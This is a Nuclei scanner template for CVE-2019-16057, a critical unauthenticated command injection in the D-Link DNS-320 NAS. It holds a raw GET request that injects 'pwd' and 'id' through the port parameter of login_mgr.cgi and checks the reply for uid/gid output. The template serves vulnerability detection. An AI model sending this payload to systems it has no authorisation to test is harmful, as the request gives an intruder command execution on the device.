id: cve-2019-16057
info:
  name: D-Link DNS-320 login_mgr.cgi Remote Command Injection
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    The login_mgr.cgi script in D-Link DNS-320 through 2.05.B10 is vulnerable to remote command injection.
    An attacker can execute arbitrary commands on the server by exploiting this vulnerability.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2019-16057
  classification:
    cve-id: CVE-2019-16057
    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  tags: rce,d-link,critical

http:
  - raw:
      - |
        GET /cgi-bin/login_mgr.cgi?C1=ON&cmd=login&f_type=1&f_username=admin&port=80%7Cpwd%26id&pre_pwd=1&pwd=%20&ssl=1&ssl_port=1&username= HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Nuclei
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "uid="
          - "gid="
